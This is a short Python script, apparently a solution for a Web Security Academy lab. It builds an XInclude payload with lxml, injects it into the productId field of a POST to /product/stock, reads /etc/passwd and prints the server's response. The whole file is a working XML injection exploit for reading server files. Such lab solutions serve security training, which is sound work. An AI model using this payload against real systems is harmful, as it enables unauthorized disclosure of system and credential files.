from web_security_academy.core.logger import logger
from lxml import etree


def solve_lab(session):
    path = "/product/stock"

    xinclude_namespace = "http://www.w3.org/2001/XInclude"
    xinclude = "{%s}" % xinclude_namespace
    nsmap = {"xi": xinclude_namespace}

    foo = etree.Element("foo", nsmap=nsmap)
    etree.SubElement(foo, f"{xinclude}include", parse="text", href="file:///etc/passwd")
    foo = etree.tostring(foo).decode()

    data = {"productId": foo, "storeId": "1"}

    logger.info(
        f'Injecting an XML external entity with the following POST request to "{path}":'
    )
    logger.info(f"{data}")

    resp = session.post_path(path, data=data)
    logger.success("XXE injection successful with the following response:")
    print(f"{resp.text}")
